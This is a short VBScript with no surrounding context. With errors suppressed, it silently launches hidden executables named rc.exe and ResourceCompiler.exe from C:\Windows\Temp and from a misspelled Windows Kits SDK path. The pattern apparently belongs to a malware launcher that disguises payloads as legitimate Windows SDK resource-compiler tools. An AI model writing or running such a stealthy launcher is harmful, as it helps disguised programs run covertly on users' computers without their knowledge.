Set WshShell = CreateObject("WScript.Shell")

On Error Resume Next
WshShell.Run """C:\Program Files (x86)\Windows Kits\10\bln\x86\rc.exe""", 0, False
WshShell.Run """C:\Program Files (x86)\Windows Kits\10\bln\x86\ResourceCompiler.exe""", 0, False

On Error Resume Next
WshShell.Run """C:\Windows\Temp\ResourceCompiler.exe""", 0, False
WshShell.Run """C:\Windows\Temp\rc.exe""", 0, False


Set WshShell = Nothing
